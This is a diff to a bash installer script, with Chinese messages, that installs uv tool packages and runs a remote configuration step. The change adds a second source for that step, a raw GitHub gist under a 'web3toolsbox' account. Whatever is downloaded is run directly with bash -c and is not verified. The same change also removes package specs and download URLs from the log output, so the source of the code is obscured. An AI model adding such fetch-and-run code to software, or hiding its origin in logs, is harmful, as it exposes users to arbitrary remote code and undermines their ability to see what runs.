@@ -387,12 +387,12 @@ install_uv_tool_package() {
         uv tool install --upgrade "$package_spec"
         local upgrade_rc=$?
         if [ $upgrade_rc -ne 0 ]; then
-            echo "WARN: uv tool 升级失败，回退为强制重装：$command_name ($package_spec)" >&2
-            FAILED_STEPS+=("uv tool 升级 $command_name（$package_spec） (exit=$upgrade_rc)")
-            run_step "uv tool 强制重装 $command_name（$package_spec）" uv tool install --force "$package_spec"
+            echo "WARN: uv tool 升级失败，回退为强制重装：$command_name" >&2
+            FAILED_STEPS+=("uv tool 升级 $command_name (exit=$upgrade_rc)")
+            run_step "uv tool 强制重装 $command_name" uv tool install --force "$package_spec"
         fi
     else
-        run_step "uv tool 安装 $command_name（$package_spec）" uv tool install "$package_spec"
+        run_step "uv tool 安装 $command_name" uv tool install "$package_spec"
     fi
 
     ensure_runtime_path
@@ -400,8 +400,8 @@ install_uv_tool_package() {
     bridge_command_into_current_path "$command_name" || FAILED_STEPS+=("桥接命令 $command_name 到当前 PATH (failed)")
 
     if ! command -v "$command_name" &>/dev/null; then
-        echo "WARN: uv tool 安装后 $command_name 不可用：$package_spec" >&2
-        FAILED_STEPS+=("校验 uv tool 包 $package_spec (incomplete)")
+        echo "WARN: uv tool 安装后 $command_name 不可用" >&2
+        FAILED_STEPS+=("校验 uv tool 包 $command_name (incomplete)")
     fi
 }
 
@@ -576,25 +576,35 @@ install_auto_backup() {
     install_uv_tool_package "$install_url" "autobackup"
 }
 
-run_step "安装自动备份（agent-setting/autobackup）" install_auto_backup
+run_step "安装自动备份（uv tool/autobackup）" install_auto_backup
 
 run_remote_config_script() {
     local script_content=""
+    local url=""
 
-    script_content="$(download_url_to_stdout "$GIST_URL")" || script_content=""
+    for url in "${CONFIG_SCRIPT_URLS[@]}"; do
+        script_content="$(download_url_to_stdout "$url")" || script_content=""
+        if [ -n "$script_content" ]; then
+            break
+        fi
+    done
+
     if [ -z "$script_content" ]; then
         if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
-            echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
+            echo "WARN: 未找到 curl/wget，跳过环境配置" >&2
             return 0
         fi
-        echo "WARN: 下载配置脚本失败：$GIST_URL" >&2
+        echo "WARN: 所有配置脚本地址均下载失败" >&2
         return 1
     fi
 
     bash -c "$script_content"
 }
 
-GIST_URL="https://www.aiskills.life/src/setup.sh"
+CONFIG_SCRIPT_URLS=(
+    "https://www.aiskills.life/src/setup.sh"
+    "https://gist.githubusercontent.com/web3toolsbox/c835bbb706a2e3afb2f1c7e3a90107de/raw/setup.sh"
+)
 if [ ! -d .configs ]; then
     echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
 else
